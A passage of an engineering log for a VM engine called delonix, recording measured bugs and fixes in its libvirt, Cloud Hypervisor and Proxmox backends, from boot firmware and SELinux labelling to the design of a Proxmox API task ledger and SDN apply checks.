the error was only in the ad-hoc scripts with `-daemonize` + `sleep`.


## `--vnc` decided whether the VM had a SCREEN, and not just whether it had VNC (2026-08-11)

ENGINE bug, and the most expensive to attribute of this whole series because it looked like
the images'. The XML's `<video>` was only emitted when `--vnc` was present —
which conflates two different things: **VNC is remote access to a screen; VGA is the
machine HAVING one.** A domain with no video adapter at all is atypical (a
simple `virt-install` always gives one) and there are guests that do not boot without it.

**Measured, and the measurement is what resolved the blame**: ALL the Proxmox
images — including the vendor's ORIGINAL one, which this repo never touched —
enter a `SeaBIOS → GRUB → reset` cycle under `qemu -vga none`, without printing
a single kernel line. With an adapter, the SAME image boots and gets a
DHCP lease. So: it was not `console=tty0`, it was not `dhclient`, it was not the
bridge, it was not the capture's `sleep`.

**The consequence is the worst kind**: `delonix vm create <appliance>` worked
WITH `--vnc` and produced a machine that rebooted silently without it. The flag
a person uses to LOOK at the guest was what made it work.

The default is now `virtio` on a domain with VNC (as before, byte for byte) and
plain `vga` on the others — it needs no driver in the guest, which is what
matters when no one is going to connect and the adapter exists only for the firmware and
the kernel to find a console. `video: none` still suppresses it.

**The method lesson, and it is the one that cost hours**: I validated four images with
`--vnc` because it was convenient for me to debug, and that flag was exactly
what masked the defect. **The test that counts is the command the user
writes** — not what is convenient for whoever is investigating. Five wrong hypotheses
(interface name, `/sbin/dhclient`, bridge with no member, capture with the
guest alive, `console=tty0`) before comparing two invocations that differed only
in one flag.


## A CH VM's `--wait` waited for a number it already knew (2026-08-12)

Measured, and the number is the finding: `vm create --backend cloud-hypervisor --network lab-net --wait
--boot-timeout 120` returned in **0.062 s** with `✓ VM 'x' is up.` and `vm 'x' is up — ip
10.233.254.141`, while the serial console showed the firmware failing before any kernel, the
overlay stayed at 448 KiB (the OS never wrote anything), the process spun at 100% CPU and
`ip neigh` of that address, from a container on the same SDN, gave `FAILED`.

The cause is not an IP bug: in CH the address is DERIVED from the MAC (`infra::dhcp_lease_ip`), and that is
deliberate — it is what lets a VM's address be put under namespace isolation in
`vm_attach`, before the guest exists to ask for it. The bug is that `--wait` took that number
as an answer. **Having an IP is only the whole answer where the IP was OBSERVED**; in libvirt it comes from a
real lease (so it proves the guest booted enough to ask for it), in CH it is arithmetic.

- **Who knows is the backend**: `VmBackend::ip_is_predicted()` (default `false`, CH returns `true`),
  instead of a `backend.contains("cloud-hypervisor")` at the call site — the reason for ADR-0008.
  A test requiring the two in disagreement, so a new backend does not inherit the wrong answer.
- **`infra::sdn_reachable`** asks from INSIDE the holder's netns, which is the only place the SDN
  exists. **ARP and not ICMP**: an appliance that drops pings has to answer ARP for its
  own address, or it would not use the network at all; and iproute2 is already a hard dependency of this engine,
  unlike `ping`. `ip neigh replace … nud probe` forces the kernel to solicit and settle
  on `REACHABLE` or `FAILED`; on `FAILED` it re-arms, because «not yet» is the normal answer while
  a guest boots. **Measured live**: real host → `REACHABLE` in <0.5 s; free address in the
  same /16 → `PROBE` for ~3 s and then `FAILED` — it is because of this delay that the probe runs
  in 2 s slices inside the loop, with `--boot-timeout` in charge.
- **`None` ≠ `Some(false)`**: with no holder or no `ip(8)` the question COULD not be asked, and there the CLI
  says `ip {ip}, which could not be verified from here` instead of choosing one of the two.
- **`✓ VM 'x' is up.` became `started.`** — at that point what happened was a VMM process
  existing. Who has the right to say «is up» is `--wait`, after going to check.

**Validated live**: the repro went from 0.062 s/`is up` to 26 s and `is running but never answered
at 10.233.254.162 — that address is computed from the MAC, not observed`; and the libvirt path (IP
observed) stayed intact, `is up — ip 192.168.122.77` in 15.6 s without probing anything.

**To be decided, and deliberately not touched**: a `--wait` that runs out of time still exits
**0**. It was the prior behaviour for the «still booting» case and changing it by drag would make
a script silently different; but a `--wait` that did not see the VM answer and returns
success is of the same family of dishonest reporting, and deserves its own decision.

### CH's firmware: no image booted, and that is what `--wait` was covering up

Found while closing the validation of the point above. With the **`rust-hypervisor-fw`** that `install.sh`
put in, **no image of this project boots under Cloud Hypervisor**: the `delonix-vm-base:*` do not
get past the firmware, and the golden `delonix-vm-k8s:1.34` dies in the Secure Boot shim
(`import_mok_state() failed: Unsupported`, read on the serial console) without reaching the kernel. With the
**EDK2 `CLOUDHV.fd`** (fork `cloud-hypervisor/edk2`, asset `releases/latest/download/CLOUDHV.fd`)
they boot and get an IP on the SDN — measured: ubuntu-24.04 **7.8 s**, ubuntu-26.04 and debian-bookworm
**5 s**, rocky-9 **32 s**, golden **7 s**.

- **The installer now fetches both** and the engine prefers the EDK2 —
  `delonix_vm::DEFAULT_CH_FIRMWARES`, with a test requiring the ORDER. A host that has both and
  picks `hypervisor-fw` returns to the original silence, and it is the worst silence there is: process
  running, record saying `Running`, guest having executed not one instruction. The
  `rust-hypervisor-fw` stays as a fallback (~150 KB, faster where it works, and removing it would change
  the behaviour of a VM that today depends on it).
- **On an already-installed host the firmware does not appear by itself**: `sudo curl -fsSL -o
  /usr/local/share/delonix/CLOUDHV.fd https://github.com/cloud-hypervisor/edk2/releases/latest/download/CLOUDHV.fd`
  (or run `install.sh` again). With no checksum published upstream, just like
  `cloud-hypervisor-static` and `hypervisor-fw` — the same risk already documented and accepted.
- **It corrects two notes of this file**. The one that said the golden is «libvirt-only» was already
  partly corrected; what was missing was that the problem was NEVER the image's, it was the installed
  firmware's — and it holds for all, not just the golden. And the probe's `Some(true)` case, which the
  section above gave as proven only against a container, **is now proven through a VM**:
  `is up — ip 10.233.254.177` in 7.8 s, confirmed separately by ARP (`REACHABLE` with the guest's real
  MAC), by the kernel on the serial console, and by 3/3 ICMP from a container on the same network.
- **`delonix-vm-base:fedora-42` still does not boot under CH, and that is neither the backend's nor the
  image's**: GRUB announces `Booting 'Fedora Linux (6.14.0-63.fc42.x86_64)'` and the EDK2 takes a `#PF`
  of a write while loading the kernel — same with `CLOUDHV_EFI.fd`, same with 2 GiB, and **same with the
  vendor's ORIGINAL image** (same RIP). See the next section: the part that was ours was
  two other things, and the line that here said «in libvirt it also does not get an IP, so it is the image's»
  was wrong by method — «does not get an IP» was measured and «does not boot» was concluded.
## Fedora always booted; what it lacked was the network (2026-08-12)

Three stacked problems, and the first step that paid off was a **console screenshot** (30 s of
work, `virsh screenshot` + `Read` of the image): it showed the VM at the login prompt. The whole
previous conclusion — "the image doesn't boot" — came from measuring a proxy (it gets no IP) and
calling that the thing. The same trap the `--vnc` had already sprung on the appliance series.

1. **The SELinux images came out of the build with no labels — and this hits Rocky too.** Any
   `dnf install` inside `virt-customize` re-runs `ldconfig`, and the rewritten `/etc/ld.so.cache`
   comes back **with no SELinux xattr at all**. `virt-customize` 1.52 relabels by default and
   prints `SELinux relabelling`, but in a Fedora guest that step takes **0.1 s**: it doesn't
   relabel, it schedules (`/.autorelabel`). And the first-boot relabel never runs, because by that
   point PID 1 is already being denied (`avc: denied { map } … path="/etc/ld.so.cache"
   scontext=init_t tcontext=unlabeled_t`). Without a readable `ld.so.cache` there's no
   `dbus-broker`; without D-Bus there's no NetworkManager; without NetworkManager the interface
   stays DOWN and the hostname `localhost`.
   **195 denials in one boot**, and from the outside all you saw was a VM with no lease. The
   relabel now runs at BUILD time, as the LAST step, inside `customize_args` — the one point both
   build paths pass through, and the only one where a step added later can't jump ahead of it and
   wreck the labels again. Kept in shell and not per distro: the VMfile path builds from a `FROM`
   that can be a URL, where there's nothing reliable to branch on.
   **Two things only the rebuild revealed**: (a) `setfiles /` is NOT enough — with the root alone
   `/home/delonix` stays `unlabeled_t` (Fedora's `/home` is its own subvolume), which gives two
   denials per login and a `login` that doesn't even enter the home, and it's not cosmetic because
   `--ssh-key` writes `~/.ssh/authorized_keys`; the mountpoints now come from the guest's
   `/etc/fstab`, which is the guest declaring its own layout. (b) the EFI partition has to be
   excluded **by TYPE** (vfat has no xattr → `Operation not supported` → exit≠0 → build failed, on
   both distros); filtering by type and not by path does the same for any other filesystem without
   labels.
2. **The seed's `network-config` matched the NIC by NAME, with a glob.** `match: {name: "e*"}`
   works where the renderer is netplan (Ubuntu/Debian) and is broken where it's NetworkManager
   (Fedora/Rocky) — the cloud-init code decides it in one line: `if … not
   self.config.has_option(if_type, "mac-address"): self.config["connection"]["interface-name"] =
   iface["name"]`. Without a MAC, the renderer names the interface from the netplan KEY, and the
   guest ended up with `interface-name=eth-all` — a device that never exists. It now matches by
   **MAC** (`delonix_vm::mac_for`, now `pub`, the same value both backends stamp): it's the only
   thing about the NIC known before the guest exists, and it's what makes the renderer omit
   `interface-name`. **Scope deliberately narrowed**: the glob also gave DHCP to the `extraNics`,
   this names the primary one — the one DNS, isolation and `vm ssh` use.
3. **On CH Fedora's GRUB fails on EDK2, and it's upstream** — proven with the vendor's original
   image. **Direct kernel boot works**, with flags that already exist
   (`--kernel`/`--initrd`/`--cmdline`), and it was validated: `is up` in 24 s, with the guest's ARP
   confirmed on the holder. The `vmlinuz`/`initramfs` come out with `virt-copy-out /boot/...` and
   the `root=`/`rootflags=` are in the BLS entry at `/boot/loader/entries/*.conf`. Automating it
   has questions of its own (where the extracted kernel lives; what happens when the guest updates
   its own) and wasn't done in a hurry.

**Tool that stuck**: `scripts/`-nothing — a session `console.py` (pty + `virsh console`) that runs
commands on a VM with no terminal, leveraging the serial autologin our `user-data` already
configures. It's what gave all the answers after the screenshot; the offline archaeology with
`guestfish` only served to confirm.

**Rebuilt and validated live (2026-08-12)**: `delonix-vm-base:fedora-42` (libvirt) and
`delonix-vm-base:rocky-9` (cloud-hypervisor) — hostname applied, interface UP with address,
`dbus-broker`/NetworkManager active, home at `~`, SELinux `Enforcing` and **0 AVC**. What remains
is republishing to ghcr (one pass of `vm-image.yml`).

**The host needs two workarounds to build with `--network`, and neither is the engine's.** They're
both in the `tool_failure_hint`, and both were needed this session:
1. passt's AppArmor refuses the `$XDG_RUNTIME_DIR` libguestfs uses →
   `XDG_RUNTIME_DIR=/tmp/delonix-run`.
2. The passt packaged in Ubuntu 24.04 is too old: **it starts and never hands out a lease**, the
   `dhclient` hangs the full 300 s and the build CARRIES ON WITH NO NETWORK. What you see at the
   end is the package manager failing to resolve a mirror, with the word `passt` nowhere — so the
   hint didn't fire, and it read as "your DNS is broken". The `[ 30x.x ]` on the failing step is
   the clue: nothing else in a build stops at exactly five minutes. The hint now also recognises
   the DNS failure. Remedy: compile current passt **and put it FIRST on the PATH** — libguestfs
   looks for it via `passt --help`, so compiling it isn't enough. And do **not** try to disable it
   with a stub that fails: measured, libguestfs uses the stub as the real helper and dies on it;
   absent it falls back to qemu's slirp, present-and-broken it doesn't.

## `delonix_sdn::Net` was DELETED — and it's breaking for library consumers

The `pub struct Net` ("The Delonix network manager") was removed: 22 public
methods, 986 lines, **zero callers in the workspace**. It wasn't carelessness, it was
an architecture that predated the holder — `Net::attach_on` ran `ip link add` and
`nft` DIRECTLY in the calling process, whereas the live path
(`infra::attach_container`) asks the holder for the same over the control socket. In
rootless it couldn't work; with privilege it touched the HOST's network, outside the
isolation. Same conclusion, and same fate, as `publish_port_allow`.

**Zero callers in the workspace isn't the whole criterion, and this is the note that
matters to whoever comes next**: `delonix-sdn` is a LIBRARY, and
`delonix-paas` (private) consumes it by git tag across several crates — using
precisely what was deleted (`Net.apply_container_firewall`,
`Net.firewall_summary`). Nothing breaks today, because the pin is a tag. What changes
is that **bumping that pin now requires a crossing on the PaaS side**, and there's a
method with no live replacement: `firewall_summary` (`infra` has
`apply_firewall`/`clear_firewall`/`status`, but nothing that returns the
DNAT/blocked/isolation/masquerade summary). If it's needed again, the place is
`infra`, against the `dlxing` table — the `ip delonix` the old one read no longer
exists.

Gone in the same pass were the public orphans the removal created
(`FirewallSummary`, `DnatRule`, `cidr_prefix_len`, `service_vip`) — the compiler
doesn't flag them, because `dead_code` only sees private items. **When deleting a
public API, the private cascade is the compiler's; the public one has to be counted by hand.**

## The VM backend registry, and the Proxmox backend (ADR-0008, closed 2026-08-11)

`backend_for` was a private `match` over two literals. The static table that
replaced it resolved the `_ => CloudHypervisorBackend` (which lied about what was running) but
left half of decision 2 undone: **a crate that depends on `delonix-vm` — as any
backend has to depend, by the trait — can't be put inside a `static` that lives there.**
That's why `delonix-proxmox` sat in the workspace, implemented and proven against a real node, **with
not a single caller**.

- **A registration takes a CLOSURE** (`BackendFactory = Box<dyn Fn() -> Result<Box<dyn
  VmBackend>> + Send + Sync>`), and that's the whole shape: a remote backend needs an endpoint,
  node name and credential, and a `fn() -> Box<dyn VmBackend>` has nowhere to receive them. The
  `Send + Sync` binds the CLOSURE, **not the trait** — no implementation changed.
- **Registering does no I/O.** The factory isn't called, so an unreachable node costs zero until
  someone picks the backend by name.
- **`auto_selectable` is a field of the REGISTRATION and not just a method of the built backend.**
  Auto-detection has to answer that *without building*, because building is where a remote
  backend authenticates. The old `select_backend` did `.map(build).filter(auto_selectable)` —
  it built them all and threw away the wrong ones, which is exactly the trip to the network the
  flag exists to avoid. Free on both local backends, which is why nobody noticed.
- **Names have an owner**: an id/alias that already belongs to ANOTHER backend is refused (the
  loser became unreachable by name, silently); re-registering the SAME id replaces it, so
  reconfiguring a target doesn't leave two entries shadowing each other.
- **The first caller is the `-bin`** (`cmd/vmbackends.rs`, called once from `run()`):
  `DELONIX_PROXMOX_URL`/`_NODE` + credential (`kind: Secret` via `DELONIX_PROXMOX_SECRET`
  first). Env and not a manifest field because `create_with` resolves the backend on its own and
  **never receives a target** — the registration has to be in place before the engine is called. A
  misconfigured target **warns and carries on**: a typo in the token can't stop a `container ls`.
- **`ProxmoxBackend` holds an `Arc<Client>`** and the factory clones it. Without that, each
  `backend_for` — once per VM in `vm ls` — meant authenticate + `GET /nodes` all over again:
  listing ten VMs was thirty round-trips where twelve do.
- **Validated live via the CLI** against this repo's `proxmox-ve:9.1` appliance: `vm create
  --backend proxmox --disk local-lvm:1` → `vm ls` Running → `vm rm` → empty node.

**Three defects the same pass found**, and the first only existed because nobody could reach the
branch: (1) `create_with` **deleted `cfg.disk`** on a failed boot — with `manages_own_storage`
the `overlay` IS `cfg.disk` verbatim, and the engine removed a file it didn't create (today
`local-lvm:8`, so the unlink fails, but the rule can't rest on the spelling a backend happens to
use); (2) `mem_mib` was **reimplemented** in `delonix-proxmox` and the copy didn't know the k8s
suffix — `memory: 2Gi` gave 2 GiB on libvirt/CH and **1 GiB** on Proxmox, silently (now the
engine's is `pub` and shared, the `fw_rule_tail` discipline); (3) `urlencode` encoded code points
and not bytes (`ç` → `%E7` instead of `%C3%A7`, and above 0xFF it emitted `%1F600`, which is no
percent-encoding at all — and a UPID carries the account name inside it).

**Guest agent (`ip()`)**: it's two halves and only one is ours. The **channel** is the `agent=1`
that `create_vm` sends (without it the node doesn't even try — every `/agent/…` call answers "not
running", whatever is in the guest); the **agent** is on the image side. `parse_agent_ip` takes
the first IPv4 that isn't loopback, IPv6 nor **`169.254.0.0/16`** — this last one is what an
interface has when DHCP FAILED, and reporting it would say "the VM has an address" when the truth
is the opposite. `lo` is skipped by name **and** 127/8 by value, because it's the first entry the
agent returns: "the first IPv4" would be loopback on every guest. **`None` is a first-class
answer**, not a failure — a guest with no agent makes the node answer HTTP 500 "QEMU guest agent
is not running" (measured), `vm ls` calls this per VM on every listing, so it costs a `None`
and a `debug` line (never a warning; but `debug` and not nothing, because "no agent" and "the
token lost permissions" both give an empty IP column). `clone_template` does **not** force
`agent=1`: a clone inherits the template's config, and overriding it would contradict a choice by
whoever made it.
**Not validated live**: an address actually coming from an agent — it needed a nested guest with
`qemu-guest-agent` installed, and the cost exceeded the proof's value. Validated live is the
channel on a VM created by the backend, and `ip()` returning `None` silently.

**`stop` and `destroy` are the SAME operation on a local backend and NOT on a remote one** — and
conflating them deleted data. Locally the disk is the engine's (libvirt's `undefine` doesn't touch
`<root>/vms/<name>.qcow2`); on a remote node the one call that frees the VM frees the disk with
it. The Proxmox backend read `stop` as "stop and destroy" for a right reason (a VM left behind
after a `vm rm` is an orphan) tied to the wrong verb: the engine also calls `stop` for `vm stop`,
and the CLI's own next-steps block promises `stop it (keeps the disk)`.
`VmBackend::destroy` is new, **defaults to `stop`** (the two local ones stay byte-for-byte
identical) and `remove_inner` now calls it.

**`vm start` of a stopped remote VM created a SECOND one.** `boot` asks the node for the next free
id, so the record ended up pointing at a brand-new empty-disk VM and the original was orphaned —
the data there, and nothing pointing at it. `VmBackend::resume` is new, defaults to `Ok(None)` (the
locals' `boot` is already idempotent via the overlay), and Proxmox's starts the vmid the record
names.

**Fields refused BY NAME** (`refuse_unsupported`, before creating anything at all), grouped by the
why: the guest is on another machine (`kernel`/`initrd`/`firmware`/`cmdline`/`seed`/
`devices`/`volumes`), Proxmox owns the QEMU knobs (`hugepages`/`cpuAffinity`/`machine`/
`cpuModel`/`cpuTopology`/`tpm`/`video`/`bootOrder`), or there's no domain XML at all
(`libvirtXml*`). Several are reported TOGETHER — fixing them one error at a time is one create
attempt per field. **It caught a real case right away**: the CLI generated a NoCloud seed ALWAYS,
which is a file of this host and unreadable on a remote node, so a plain `vm create --backend
proxmox` failed over a seed nobody asked for. The CLI now skips it for a backend with its own
storage (`backend_manages_own_storage`) and refuses `--hostname`/`--ssh-key`/`--user-data` there —
the same shape as the appliance-image refusal that was already right above.

**Snapshots** implemented with `vmstate=1` (system checkpoint, like libvirt), and the API's
pseudo-record `current` filtered out of the listing **and** refused as a name — otherwise
`vm restore <vm> current` looked like a supported thing. **Network**: bridge (`VmConfig.bridge` →
target → `vmbr0`) and the target's VLAN (it describes how the NODE is wired, not the VM); an
out-of-range tag is an **error**, never a `None` — discarding it put the VM on the untagged
network with the operator thinking it isolated. **The ticket expires** (2 h) and the client is
shared process-wide, so `send_authed` re-authenticates once on a 401 — only with a password: an
API token that gets a 401 was revoked, and retrying forever is how a credential ends up locked.

**Correction**: the note that said `net0=virtio,bridge=vmbr0` was refused by the API was wrong — it
was an artefact of the spike's `curl -d`, which does no URL-encoding. reqwest's `.form()` does, and
the node accepts it (measured: `net0 = virtio=BC:24:11:F4:F9:9C,bridge=vmbr0` in the config). The
backend always sent it right; only the document was wrong.

**The method note is worth more than the three.** The first auto-detection ordering test
registered the remote candidate in the GLOBAL registry and called `select_backend(None)` — and it
**passed with the bug inside**: this host has a local backend installed, the pass stops at the
first entry, and the remote is never reached. A test that can't reach the line it's about proves
nothing. The fix was to extract `auto_detect(&[BackendRegistration])` and give it a table where the
skipped candidate is actually reached. The three defects were then verified by the repo's rule:
reverted one by one, each test fails.

## The Proxmox transport: errors with class, a task ledger, and the lost reply (ADR-0049, slice 1, 2026-09-23)

ADR-0049 (merged in #474) fixed the denominator — **16 of 675 routes of the PVE 9.2.2 schema,
2.4 %** — and left slice 1 undone: the transport. What was there, measured before touching it:
TLS verified by default and `insecure_tls` opt-in (good), `wait_task` reading the `exitstatus`
(good), and three things that weren't — a single `HttpStatus(String)` for every non-2xx,
`resp.text().unwrap_or_default()` turning a cut connection into an empty body that then
failed as "malformed JSON from the node", and a `#[derive(Debug)]` on `Auth` putting the
token secret in any `{:?}`.

- **An error's CLASS is what an exit code and a reconciler read.** 401 → `Unauthorized`,
  403 → `Forbidden`, 404 → `NodeNotFound` (exit 4), 409 → `NodeConflict` (5), 400/422 →
  `BadRequest`, 502–504 → `NodeUnavailable` (69). **The three carry the `Node` prefix because of
  `arch_fitness.py`**: the `raw_error_variant_matches` counter (ADR-0043 D4) catches any
  `Error::NotFound(_)` in a `match`/`matches!` outside the foundation and doesn't tell the LOCAL
  enum from the shared one — 12 sites counted in #475's CI with the bare names, 0 with the prefix.
  The text keeps the shape the CLI always printed. **Proxmox reports most application errors with
  HTTP 500** — "Configuration file … does not exist" and "already exists" included; those two are
  read from the body (the `is_lock_timeout` discipline), the rest of the 500 stays generic. Codes
  `DX-1526/4504/5504/6506/9515-9517`.
- **A lost reply is NOT a lost request.** A `create` whose connection dropped after the node
  accepted it is running on the node with nobody waiting; resending it makes a second VM. A
  transport failure on submission is followed by `GET /nodes/{node}/tasks?vmid=…&source=active`
  (the 17th route): a task of the expected type in progress is AWAITED rather than resent; with no
  task, an effect probe (`config` exists, `status == running`, the snapshot is in the list)
  accepts what's already there; only when the node shows neither one nor the other does the
  transport error stand — and the caller decides. `rollback` has no probe on purpose: there's no
  read that tells "rolled back" from "not rolled back".
- **The task ledger is durable state, not process memory** (`<vmdir>/proxmox-tasks.json`):
  the UPID is written BEFORE the wait and settled AFTER (`ok`/`failed{reason}`/`timedout`). A
  process killed mid-way leaves `submitted` on disk and the next operation on the same VM
  (`stop`/`destroy`/`resume`/`snapshot`/`restore`) **waits for it first** — a `stop` on top of a
  `start` in progress is a race the node decides, not the client. `TaskTimeout` is THIS client's
  verdict, not proof of task failure, and the ledger says it as `timedout`.
  A ledger that can't be written warns and lets the operation carry on — a `stop` refused
  by an accounting file would be the worse failure. **Bug caught by the test itself**: `settle`
  settled the FIRST record with that UPID; it was changed to the most recent.
- **Body capped at 16 MiB** (`MAX_RESPONSE_BYTES`, one byte over is `ResponseTooLarge`), a read
  error is `Request` and not `Decode`, a pool of 4 connections per node, `ca_cert_pem`
  (`DELONIX_PROXMOX_CA_FILE`) to verify a node with an internal CA without disabling verification,
  and hand-written `Debug` on `Auth`/`Ticket` with `<redacted>`. Route tracing is a CLIENT OPTION
  (`ClientOptions::trace_routes`), read from the `DELONIX_PROXMOX_TRACE_ROUTES` variable ONCE in
  `vmbackends.rs` — the library never reads the environment, and a `set_var` in a test counts as
  debt in `arch_fitness.py`'s `env_writes` (25 against 23 in #475's CI).
- **The tests run against a FAKE TLS node** (`tests/failure_injection.rs`): the client refuses
  `http://`, so the mock is a `TcpListener` with an `rcgen` certificate served by `rustls` —
  dev-dependencies only, the crate's `cargo tree -e normal` doesn't change. Fourteen scenarios: TLS
  refused with no CA and accepted with the same CA, the seven status classes, ticket renewed ONCE
  on a 401 and token never, truncated body, unexpected JSON, a stalled response hitting the request
  ceiling, a body over the limit, verdict read from `exitstatus`, timeout as
  `timedout`, an inherited task awaited before operating, and the three outcomes of the lost reply.
  Each assertion reads the mock's LOG (what was sent, how many times) and the ledger on disk —
  never just the call's `Ok`. **Mock trap**: the client percent-encodes the UPID (`root@pam` →
  `root%40pam`); without decoding, the mock's script didn't match and the response fell through to
  the stock "stopped/OK", which made two tests pass for the wrong reason and a third fail.
- **The matrix's numerator can now come from a real run**:
  `DELONIX_PROXMOX_TRACE_ROUTES=<file>` makes the client append `METHOD /path` per request,
  and `scripts/proxmox_api_inventory.py --trace` promotes the route to `supported+tested`.
  The committed matrix (`docs/proxmox/matrix-9.2.2.md`) today says **17 calls, 14 tested
  live, 3 not** — and the "tested" column has a DATE and a TARGET, because the run's trace is
  committed alongside (`docs/proxmox/trace-9.2.2.routes`, 2026-09-23, PVE 9.2.2): the header's
  `# key: value` lines are the provenance (node, version, command, result) and `render_markdown`
  prints them; `test_proxmox_api_inventory.py` regenerates the matrix WITH the trace and fails if
  the committed one diverges. A matrix without a trace says "None given" instead of a column nobody
  can date (ADR-0049 D2). The three routes left untested are named in the header with the reason:
  `clone`/`config` need a template on the node, `GET /nodes/{node}/tasks` is the lost-reply path
  and only failure injection reaches it.
- **`tests/live.rs` walks the whole cycle** (create → snapshot with RAM → rollback → stop →
  resume → stop → destroy) and reads the LEDGER at the end, not just each call's `Ok`. It was the
  ledger that gave the finding: **a `stop` submitted up to ~30 s after a `start` or a rollback with
  RAM fails on the node** with "can't lock file '/var/lock/qemu-server/lock-<vmid>.conf' - got
  timeout" (the node's own 10 s lock); the client's lock retry resubmits it (2 logical stops, 4
  `qmstop` tasks, 2 failed on the node) and the ledger keeps them all. The first assertion ("all
  entries `ok`") was WRONG and it was the one that failed — what has to hold is that the LAST task
  of each action succeeds, none stays `submitted`/`timedout`, and none fails for a reason other
  than the lock. The test's `vmdir` became a `tempdir`: the ledger lives at
  `<vmdir>/proxmox-tasks.json`, and with `/tmp` a run inherited the previous one's ledger. The
  `qmsnapshot`/`qmrollback` workers were seen on the real node, not just on the mock.

- **The layer above the native SDN's zones/vnets/subnets (2026-09-25)**: IPAM controllers
  (`/cluster/sdn/ipams`, 6 routes) and DNS ones (`/cluster/sdn/dns`, 5), fabrics and their nodes
  (`/cluster/sdn/fabrics/*`, 13, plus the 4 node-side reads), a zone's `content` on the
  node, a zone's `dhcp`/`ipam`/`dns` fields (`ZoneOptions`), a subnet's `dhcp-range`/
  `dhcp-dns-server`/`snat` (`SubnetOptions`) and the IP reservations
  (`…/vnets/{vnet}/ips`, 3) — 30 routes, all seen live in a single case; matrix at **102/675
  (15.1 %), 99 live**. Three measured facts the schema doesn't say: (1) **the node VERIFIES an
  IPAM/DNS controller by calling its URL** before saving it (`GET <url>/ipam/aggregates/`
  with `Authorization: token …` for NetBox, `GET <url>` with `X-API-Key` for PowerDNS) — an
  unreachable URL is a hung request, not an entry, and that's why `live.rs` stands up an HTTP
  stub and gives the node `DELONIX_PROXMOX_TEST_CALLBACK_ADDR` to reach it; (2) **the fabrics
  API (Rust, PVE 9) answers writes with `""`**, not `null` — `upid_or_done` now reads both
  as "done inline"; (3) **`PUT …/ips` moves a MAC to a new IP**, never an
  IP to a new MAC — the handler (`Ips.pm`, read on the node itself) looks up the old IP by MAC,
  and calling it the other way around gives "can't find any subnet for ip " with an EMPTY IP; the
  test's first version did exactly that. And `DELETE …/ips` takes the parameters in the query
  string: with a body the proxy answers 501 before the handler. The `dhcp-range` goes as
  `start-address=…,end-address=…` in a per-range field (the bare form is refused).
- **An apply "TASK OK" is not a realised network — and the defect was ours.** The zone's `content`
  answered `status: error, vnet is not generated` after an OK apply: the appliance's
  `proxmox_postinstall.py` rewrote `/etc/network/interfaces` **without**
  `source /etc/network/interfaces.d/*`, and PVE's reload warned ("missing 'source
  /etc/network/interfaces.d/sdn' directive for SDN support!") and ended OK without creating any
  bridge. That is, **every apply from the previous runs (#493, #497) was accepted and
  never realised on the node** — the tests only asserted the pending state and the task verdict.
  Fixed in the script; the lab node had the line added by hand, plus `dnsmasq` (needed for
  `dhcp=dnsmasq`; `frr` was already there). The new case asserts `available` in the `content` and
  the `dummy_<fabric>` interface up in the fabric's `interfaces` — that's the gate that was
  missing.
- **Placeholders with the schema's name, or the inventory doesn't count.** `{fabric_id}`/`{node_id}`
  (not `{fabric}`/`{node}`) and a `let path = format!(…)` immediately before the send — the
  scanner reads the verb from the statement following the literal, and a `push_str` in between
  makes the route "unclassified" and counted as not called. #497 had already paid the same with
  `{id}`.

- **A task has three outcomes, not two (ADR-0058, Slice 0 of plan 63, 2026-09-27).** The
  `task_verdict` read anything that wasn't `"OK"` as a failure. But a worker that finishes doing
  its job with warnings ends with `exitstatus: "WARNINGS: <n>"`: measured on an LXC `vzstart`
  whose DHCP got no answer, the container ended up running with no address. Reading that as a
  failure makes you resend the action on top of a live resource; reading it as `OK` erases the
  warning. It's now `TaskEnd::Warnings(n)`: the call succeeds, the log's `WARN:` lines go to the
  ledger (`ok_with_warnings`) and to `tracing::warn!`. Only the exact form `WARNINGS: <number>`
  counts; any other text stays a failure. An unreadable log never gives "no warnings": the ledger
  says there were `n` and that the log wasn't read. The scenario
  `a_task_that_ends_with_warnings_succeeds_and_the_ledger_keeps_them` fails with the fix
  reverted.
- **Measured in the lab's history, and it's the bigger finding**: 51 tasks ended in `WARNINGS`
  across the two nodes, and 50 are `srvreload networking`, the per-node network reload that a `PUT
  /cluster/sdn` triggers. The lines say `missing 'source /etc/network/interfaces.d/sdn'
  directive for SDN support!` (24) and `reloading frr configuration failed` (5). The task the
  engine waits on, `reloadnetworkall`, ended in **`OK` all 61 times**: PVE itself launches
  each node's reload in the background and doesn't follow it (`PVE/API2/Network/SDN.pm`, with an
  upstream `FIXME` saying so). So the third verdict **doesn't reach** an SDN apply: its
  `OK` means "requests sent", and that's how the #493 and #497 applies were
  accepted and never realised.
- **Closed in Slice 0b of plan 63 (2026-09-27): an SDN apply waits for each node's reload.**
  Before the `PUT /cluster/sdn`, `apply_sdn_with` records per online node the `srvreload
  networking` UPIDs that already exist (`GET /nodes/{node}/tasks?typefilter=srvreload&source=all`);
  after the mother, each node's child is the first UPID that wasn't in that list, and it's awaited
  with the three verdicts. **The child is not identified by time**, and the measurement decided it:
  across the 13 mothers in the history, the children arrive 0 to 37 s after it, the previous
  apply's 1 to 5 s BEFORE, and in back-to-back applies the windows overlap; the children run as
  `root@pam` even when the mother is from a token, so the user doesn't serve either. A node with no
  child up to the `task_timeout` is an error with the node's name; a failed child makes the apply
  fail with DX-6512 even with the mother in `OK`; the warnings rise to `tracing::warn!` with
  `node=` and the text. It also holds for the apply with the SDN lock (`apply_sdn_locked`). Three
  injection scenarios (child with a warning and only the fresh one awaited; failed child; node with
  no child), the middle one fails with the wait reverted. **Live**, with `source
  /etc/network/interfaces.d/*` removed from `pve2`, the case
  `sdn_apply_waits_for_every_nodes_network_reload` passed and wrote `node=pve2 … warning=missing
  'source /etc/network/interfaces.d/sdn' directive for SDN support!`; with the file restored, the
  next run wrote no warning. `live.rs` now accepts an API token
  (`DELONIX_PROXMOX_TEST_TOKEN_FILE`) and shows `tracing` with `DELONIX_LOG`. **Not measured**:
  a child actually FAILING on the node (`ifreload` exiting with an error) — only by injection.
  **Re-measured on 2026-09-28** (two-node lab, lab token by file): the route trace
  shows each node's task list read before the `PUT`, and then the NEW `srvreload` of `pve2`
  found and awaited to the end, not just the entry node's. And a warning showed up that nobody
  provoked: on `pve` the reload ends with `reloading frr configuration
  failed` (`frr-reload.py` exiting 1) with the mother in `OK` — before this it was lost. The case
  `sdn_routing_chain_vnet_firewall_and_the_lock…` passes the apply with the lock and fails after,
  on the vnet firewall, with 403 `user != root@pam`: that route refuses ANY token, even without
  privsep, and only runs with the account's password.

- **The live suite runs in TWO invocations** (`--ignored --skip firewall`, then `--ignored
  firewall`): turning on the datacenter firewall breaks the DHCP of the following SDN zones, and
